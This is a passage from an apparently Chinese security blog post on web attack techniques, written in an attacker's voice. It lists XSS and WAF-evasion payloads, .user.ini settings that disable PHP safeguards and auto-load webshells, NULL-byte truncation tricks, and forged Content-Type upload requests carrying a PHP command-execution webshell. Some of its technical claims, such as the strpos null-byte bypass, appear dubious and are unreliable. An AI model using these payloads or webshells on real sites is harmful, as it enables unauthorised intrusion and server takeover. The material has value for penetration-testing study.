+<h4 id="示例：表单字符限制"><a href="#示例：表单字符限制" class="headerlink" title="示例：表单字符限制"></a><strong>示例：表单字符限制</strong></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;10&quot;</span> <span class="attr">oninput</span>=<span class="string">&quot;this.value = this.value.replace(/[^a-zA-Z0-9]/g, &#x27;&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>绕过方法：</p>
+<ul>
+<li><p><strong>开发者工具 (F12) 直接修改 <code>maxlength</code> 属性</strong></p>
+</li>
+<li><p><strong>拦截请求并手动修改数据</strong></p>
+</li>
+<li><p>使用 <code>curl</code> 或 <code>Burp Suite</code> 直接提交超长数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST <span class="string">&quot;http://example.com/login&quot;</span> -d <span class="string">&quot;username=aaaaaaaaaaaaaaaaaaaa&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h3 id="2-绕过-HTML-过滤"><a href="#2-绕过-HTML-过滤" class="headerlink" title="2. 绕过 HTML 过滤"></a><strong>2. 绕过 HTML 过滤</strong></h3><h4 id="（1）禁用-JavaScript"><a href="#（1）禁用-JavaScript" class="headerlink" title="（1）禁用 JavaScript"></a><strong>（1）禁用 JavaScript</strong></h4><p>如果前端用 JavaScript 进行检查，可以直接 <strong>禁用 JavaScript</strong>：</p>
+<ul>
+<li><p>在 Chrome 地址栏输入：</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chrome:<span class="comment">//settings/content/javascript</span></span><br></pre></td></tr></table></figure>
+
+<p>关闭 JavaScript，然后输入任意内容提交。</p>
+</li>
+</ul>
+<hr>
+<h4 id="（2）修改-HTML-代码"><a href="#（2）修改-HTML-代码" class="headerlink" title="（2）修改 HTML 代码"></a><strong>（2）修改 HTML 代码</strong></h4><p>如果前端的表单有 <code>maxlength</code> 或 <code>pattern</code> 限制：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;10&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;^[a-zA-Z0-9]+$&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击者可以 <strong>手动修改 HTML</strong> 代码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">maxlength</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>或者在浏览器 <strong>F12 开发者工具</strong> 直接修改 <code>&lt;input&gt;</code> 标签的属性。</p>
+<hr>
+<h3 id="3-绕过-JavaScript-关键字替换"><a href="#3-绕过-JavaScript-关键字替换" class="headerlink" title="3. 绕过 JavaScript 关键字替换"></a><strong>3. 绕过 JavaScript 关键字替换</strong></h3><p>一些网站可能会在前端用 JavaScript 过滤敏感词，如 <code>script</code>、<code>alert</code>：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input = input.<span class="title function_">replace</span>(<span class="regexp">/script/gi</span>, <span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过方法：</strong></p>
+<ul>
+<li><strong>大小写混淆</strong>：<code>ScRiPt</code></li>
+<li><strong>使用 Unicode 编码</strong>：<code>script</code></li>
+<li><strong>分割字符串拼接</strong>：<code>s&quot; + &quot;cript&quot;</code></li>
+<li><strong>HTML 编码绕过</strong>：<code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;</code></li>
+</ul>
+<p>示例：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=eval(atob(&quot;YWxlcnQoMSk=&quot;))&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>解释</strong>：</p>
+<ul>
+<li><code>atob(&quot;YWxlcnQoMSk=&quot;)</code> 解码为 <code>alert(1)</code></li>
+</ul>
+<hr>
+<h3 id="4-绕过前端-XSS-过滤"><a href="#4-绕过前端-XSS-过滤" class="headerlink" title="4. 绕过前端 XSS 过滤"></a><strong>4. 绕过前端 XSS 过滤</strong></h3><p>如果网站过滤了 <code>&lt;script&gt;</code> 标签，可以尝试：</p>
+<ul>
+<li><strong>事件触发</strong>（<code>onerror</code>、<code>onclick</code> 等）</li>
+<li><strong>SVG 标签</strong>（<code>&lt;svg/onload=alert(1)&gt;</code>）</li>
+<li><strong>JavaScript 协议</strong>（<code>javascript:alert(1)</code>）</li>
+</ul>
+<p><strong>示例：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="5-绕过-WAF（Web-应用防火墙）"><a href="#5-绕过-WAF（Web-应用防火墙）" class="headerlink" title="5. 绕过 WAF（Web 应用防火墙）"></a><strong>5. 绕过 WAF（Web 应用防火墙）</strong></h3><p>有些 WAF 可能会拦截恶意输入，如：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以使用 <strong>分割、编码、动态执行</strong> 等方式绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">html复制编辑&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;</span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;</span><br><span class="line">&lt;svg onload=eval(atob(&#x27;YWxlcnQoMSk=&#x27;))&gt;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="6-绕过-URL-过滤"><a href="#6-绕过-URL-过滤" class="headerlink" title="6. 绕过 URL 过滤"></a><strong>6. 绕过 URL 过滤</strong></h3><p>有些网站会检测 URL 是否包含敏感参数，如：</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">http://example.com/?input=<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过方式</strong>：</p>
+<ul>
+<li><strong>URL 编码</strong>：<code>%3Cscript%3Ealert(1)%3C/script%3E</code></li>
+<li><strong>双重编码</strong>：&#96;%253Cscript%253Ealert(</li>
+</ul>
+<h2 id="user-ini是做什么的"><a href="#user-ini是做什么的" class="headerlink" title=".user.ini是做什么的"></a>.user.ini是做什么的</h2><h3 id="user-ini-的作用"><a href="#user-ini-的作用" class="headerlink" title=".user.ini 的作用"></a><strong><code>.user.ini</code> 的作用</strong></h3><p><code>.user.ini</code> 文件可以在<strong>当前目录及其子目录</strong>中修改 PHP 设置，比如：</p>
+<ul>
+<li>修改 <code>disable_functions</code> 以<strong>启用危险函数</strong></li>
+<li>通过 <code>auto_prepend_file</code> 让 PHP 自动加载 Webshell</li>
+<li>修改 <code>open_basedir</code> 绕过目录访问限制</li>
+</ul>
+<hr>
+<h3 id="1-user-ini-的基本用法"><a href="#1-user-ini-的基本用法" class="headerlink" title="1. .user.ini 的基本用法"></a><strong>1. <code>.user.ini</code> 的基本用法</strong></h3><p>创建 <code>.user.ini</code> 文件，写入：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions =</span><br></pre></td></tr></table></figure>
+
+<p>这会<strong>清空</strong> <code>disable_functions</code>，恢复所有被禁用的 PHP 函数，比如 <code>system()</code>、<code>exec()</code>、<code>shell_exec()</code> 等，从而可以执行系统命令。</p>
+<hr>
+<h3 id="2-auto-prepend-file（前置加载-Webshell）"><a href="#2-auto-prepend-file（前置加载-Webshell）" class="headerlink" title="2. auto_prepend_file（前置加载 Webshell）"></a><strong>2. <code>auto_prepend_file</code>（前置加载 Webshell）</strong></h3><p>可以利用 <code>.user.ini</code> 在每个 PHP 文件执行前<strong>自动加载</strong>一个 Webshell：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span> = <span class="string">&quot;shell.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样，当前目录下的所有 PHP 代码**都会自动执行 <code>shell.php</code>**，即使 <code>shell.php</code> <strong>没有被访问</strong>。</p>
+<h4 id="绕过-disable-functions"><a href="#绕过-disable-functions" class="headerlink" title="绕过 disable_functions"></a><strong>绕过 <code>disable_functions</code></strong></h4><p>如果服务器禁用了 <code>system()</code>，可以用 <code>.user.ini</code> 让 PHP 先加载一个<strong>重定义函数的文件</strong>：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span> = <span class="string">&quot;/var/www/html/bypass.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后在 <code>bypass.php</code> 中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">system</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123; <span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这样，即使 <code>system()</code> 被禁用，也可以用 <code>shell_exec()</code> 执行命令。</p>
+<hr>
+<h3 id="3-open-basedir-绕过目录限制"><a href="#3-open-basedir-绕过目录限制" class="headerlink" title="3. open_basedir 绕过目录限制"></a><strong>3. <code>open_basedir</code> 绕过目录限制</strong></h3><p><code>open_basedir</code> 限制 PHP 只能访问特定目录，例如：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">open_basedir</span>=/var/www/html/</span><br></pre></td></tr></table></figure>
+
+<p>但我们可以在 <code>.user.ini</code> 中<strong>覆盖这个限制</strong>：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_basedir=</span><br></pre></td></tr></table></figure>
+
+<p>这样 PHP 代码可以访问服务器上<strong>任何目录</strong>，例如读取 <code>/etc/passwd</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-user-ini-的生效规则"><a href="#4-user-ini-的生效规则" class="headerlink" title="4. .user.ini 的生效规则"></a><strong>4. <code>.user.ini</code> 的生效规则</strong></h3><ul>
+<li><code>.user.ini</code> 仅在 <strong>当前目录及其子目录</strong> 生效，不影响上级目录。</li>
+<li>PHP 解析 <code>.user.ini</code> <strong>每 5 分钟才会重新加载</strong>（由 <code>user_ini.cache_ttl</code> 控制）。</li>
+<li>只能修改 <code>php.ini</code> 允许 <code>PHP_INI_PERDIR</code> 和 <code>PHP_INI_USER</code> 级别的配置（不能修改 <code>PHP_INI_SYSTEM</code> 级别的全局配置）。</li>
+</ul>
+<p>可以使用 <code>phpinfo()</code> 查看 <code>.user.ini</code> 是否生效：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="5-user-ini-在安全中的利用"><a href="#5-user-ini-在安全中的利用" class="headerlink" title="5. .user.ini 在安全中的利用"></a><strong>5. <code>.user.ini</code> 在安全中的利用</strong></h3><h4 id="（1）Webshell-隐藏"><a href="#（1）Webshell-隐藏" class="headerlink" title="（1）Webshell 隐藏"></a><strong>（1）Webshell 隐藏</strong></h4><p>攻击者上传 <code>.user.ini</code> 后，即使 Webshell（如 <code>shell.php</code>）被删除，也可以自动加载其他后门：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span> = <span class="string">&quot;/var/www/html/hidden_shell.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="（2）绕过-disable-functions"><a href="#（2）绕过-disable-functions" class="headerlink" title="（2）绕过 disable_functions"></a><strong>（2）绕过 <code>disable_functions</code></strong></h4><p>如果 <code>disable_functions</code> 被锁定，我们可以上传 <code>.user.ini</code> 来清空它：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions =</span><br></pre></td></tr></table></figure>
+
+<h4 id="（3）权限控制绕过"><a href="#（3）权限控制绕过" class="headerlink" title="（3）权限控制绕过"></a><strong>（3）权限控制绕过</strong></h4><p>如果 <code>open_basedir</code> 限制了文件访问，可以用 <code>.user.ini</code> 清除它：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_basedir=</span><br></pre></td></tr></table></figure>
+
+<h2 id="00-截断（NULL-截断）漏洞"><a href="#00-截断（NULL-截断）漏洞" class="headerlink" title="00 截断（NULL 截断）漏洞"></a>00 截断（NULL 截断）漏洞</h2><h3 id="1-00-截断的原理"><a href="#1-00-截断的原理" class="headerlink" title="1. 00 截断的原理"></a>1. 00 截断的原理</h3><p>在 C 语言中，字符串是 <strong>以 NULL (<code>\x00</code>) 结尾</strong> 的，例如：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> filename[] = <span class="string">&quot;shell.php\x00.jpg&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>对于 PHP <strong>早期版本（≤ 5.3.3）</strong>，部分文件函数（如 <code>file_get_contents()</code>、<code>include()</code>）会受到 C 语言底层 <code>\x00</code> 终止符影响，只读取 <code>\x00</code> 之前的内容。</p>
+<h3 id="2-00-截断的利用"><a href="#2-00-截断的利用" class="headerlink" title="2. 00 截断的利用"></a>2. 00 截断的利用</h3><p><strong>（1）绕过文件上传后缀名检查</strong></p>
+<p>某些服务器会限制 PHP 文件上传，只允许 <code>.jpg</code>、<code>.png</code>，但如果使用 <code>\x00</code> 截断，可能让 PHP 误认为文件是 <code>.jpg</code>，而 <code>include()</code> 解析时仍然执行 PHP 代码。</p>
+<h4 id="服务器代码"><a href="#服务器代码" class="headerlink" title="服务器代码"></a><strong>服务器代码</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$filename</span>, <span class="string">&#x27;.php&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;禁止上传 PHP 文件！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&quot;uploads/&quot;</span> . <span class="variable">$filename</span>);</span><br></pre></td></tr></table></figure>
+
+<p>如果 PHP 版本 ≤ 5.3.3，可以尝试 **上传 <code>shell.php\x00.jpg</code>**：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;file&quot;; filename=&quot;shell.php\x00.jpg&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>服务器 <code>move_uploaded_file()</code> 看到的文件名是 <code>shell.php.jpg</code></li>
+<li>但 <code>include(&quot;uploads/shell.php\x00.jpg&quot;);</code> 解析时 **PHP 只看到 <code>shell.php</code>**，导致执行恶意代码</li>
+</ul>
+<p>✅ <strong>适用 PHP 版本：</strong> <strong>≤ 5.3.3</strong><br>❌ <strong>PHP ≥ 5.3.4 及以上</strong> 修复了 <code>\x00</code> 影响 <code>file_*</code> 系列函数的问题。</p>
+<hr>
+<h3 id="（2）绕过-file-exists-与-include"><a href="#（2）绕过-file-exists-与-include" class="headerlink" title="（2）绕过 file_exists() 与 include()"></a><strong>（2）绕过 <code>file_exists()</code> 与 <code>include()</code></strong></h3><p>如果代码用 <code>file_exists()</code> 进行文件检查：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span> . <span class="string">&quot;.php&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span> . <span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>✅ <strong>利用 NULL 截断绕过检查</strong></p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>example.com/index.php?file=shell<span class="variable">%00</span></span><br></pre></td></tr></table></figure>
+
+<p>PHP 解析：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;shell\x00.php&quot;</span>); <span class="comment">// 由于 NULL 截断，实际 include(&quot;shell&quot;)</span></span><br></pre></td></tr></table></figure>
+
+<p>成功执行 <code>shell.php</code> 代码。</p>
+<p>✅ <strong>适用 PHP 版本：</strong> <strong>≤ 5.3.3</strong><br>❌ <strong>PHP ≥ 5.3.4 及以上</strong> <strong>修复了 <code>file_exists()</code>、<code>include()</code> 受 NULL 影响的问题。</strong></p>
+<hr>
+<h3 id="（3）绕过-strpos-关键字过滤"><a href="#（3）绕过-strpos-关键字过滤" class="headerlink" title="（3）绕过 strpos() 关键字过滤"></a><strong>（3）绕过 <code>strpos()</code> 关键字过滤</strong></h3><p>PHP 过滤 <code>eval</code> 关键词：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$code</span>, <span class="string">&quot;eval&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;禁止使用 eval&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>
+
+<p>✅ <strong>NULL 截断绕过</strong>：</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>example.com/index.php?code=eva<span class="variable">%00l</span>(<span class="variable">$_GET</span>[a])</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>strpos(&quot;eva\x00l&quot;, &quot;eval&quot;)</code> **返回 <code>false</code>**（因为 PHP 早期版本会忽略 <code>\x00</code> 之后的内容）</li>
+<li>但 <code>eval($code)</code> 仍然执行 <code>eva\x00l($_GET[a])</code>，即 <code>eval($_GET[a]);</code></li>
+</ul>
+<p>✅ <strong>适用 PHP 版本：</strong> <strong>≤ 5.3.3</strong><br>❌ <strong>PHP ≥ 5.3.4 及以上</strong> <strong>修复了 <code>strpos()</code> 受 NULL 影响的问题。</strong></p>
+<h2 id="Content-Type的绕过"><a href="#Content-Type的绕过" class="headerlink" title="Content-Type的绕过"></a>Content-Type的绕过</h2><h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a><strong>绕过方式</strong></h3><h4 id="（1）伪造-Content-Type"><a href="#（1）伪造-Content-Type" class="headerlink" title="（1）伪造 Content-Type"></a><strong>（1）伪造 <code>Content-Type</code></strong></h4><p>如果服务器只允许上传图片：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/jpeg</span><br></pre></td></tr></table></figure>
+
+<p>但实际上传 PHP Webshell：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以使用 Burp Suite 修改请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/png</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>如果服务器仅<strong>检查 <code>Content-Type</code>，但不检查文件内容</strong>，PHP 代码仍然可以解析。</p>
+<hr>
+<h4 id="（2）使用双扩展名绕过"><a href="#（2）使用双扩展名绕过" class="headerlink" title="（2）使用双扩展名绕过"></a><strong>（2）使用双扩展名绕过</strong></h4><p>有些服务器可能允许 <code>.jpg</code> 文件上传但不允许 <code>.php</code>，可以尝试：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/jpeg</span><br></pre></td></tr></table></figure>
+
+<p>文件名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.php.jpg</span><br></pre></td></tr></table></figure>
+
+<p>如果服务器使用 <code>move_uploaded_file()</code> 存储，并且 <code>include()</code> 解析 <code>.jpg</code> 文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;uploads/shell.php.jpg&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>PHP 仍然会解析其中的代码</strong>。</p>
+<hr>
+<h4 id="（3）Content-Type-为空绕过"><a href="#（3）Content-Type-为空绕过" class="headerlink" title="（3）Content-Type 为空绕过"></a><strong>（3）<code>Content-Type</code> 为空绕过</strong></h4><p>某些应用可能会严格匹配 <code>Content-Type</code>，如果 <code>Content-Type</code> 为空，则使用默认处理方式：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com</span><br><span class="line"><span class="attribute">Content-Type</span>:</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>有些服务器会将未知 <code>Content-Type</code> 作为 <code>text/plain</code> 处理，从而导致上传绕过。</p>
+<hr>
+<h4 id="（4）Content-Type-头部污染"><a href="#（4）Content-Type-头部污染" class="headerlink" title="（4）Content-Type 头部污染"></a><strong>（4）<code>Content-Type</code> 头部污染</strong></h4><p>有些应用可能依赖 <code>$_SERVER[&#39;CONTENT_TYPE&#39;]</code> 进行检查：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;CONTENT_TYPE&#x27;</span>] !== <span class="string">&quot;image/jpeg&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Invalid file type&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以尝试 <strong>使用多个 <code>Content-Type</code> 头部</strong>：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/jpeg</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-php</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>某些服务器会解析第一行，而 PHP 解析最后一行，导致绕过检查。</p>
+
+    
+
+    
+
+    
+    <div class="declare"> 
+      <ul class="post-copyright">
+        <li>
+          <strong>本文作者：</strong>
+          林姜
+        </li>
+        <li>
+          <strong>本文链接：</strong>
+          <a href="http://example.com/2025/02/15/文件上传/" title="文件上传" target="_blank">http://example.com/2025/02/15/文件上传/</a>
+        </li>
+        
+        <li>
+          <strong>版权声明： </strong>
           
-          
+          本博客所有文章除特别声明外，均采用 <a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/blob/master/LICENSE" rel="external nofollow" target="_blank">MIT</a> 许可协议。转载请注明出处！
+        </li>
+        
+      </ul>
+    </div>
+    
 
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+
+    
+    
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <!-- <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a> -->
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
